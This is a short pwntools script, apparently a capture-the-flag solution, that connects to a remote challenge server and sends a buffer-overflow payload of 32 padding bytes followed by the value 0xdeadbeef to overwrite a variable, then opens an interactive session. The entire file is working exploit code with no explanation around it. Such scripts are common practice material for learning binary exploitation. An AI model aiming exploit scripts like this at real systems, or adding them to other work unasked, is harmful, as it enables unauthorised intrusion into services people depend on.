from pwn import *

# io = process('./offset')
io = remote('0.cloud.chals.io', 19052) 
context.log_level = 'debug'

offset = 32
overwrite = p64(0xdeadbeef)
payload = b'A'*offset + overwrite
io.sendline(payload)

io.interactive()
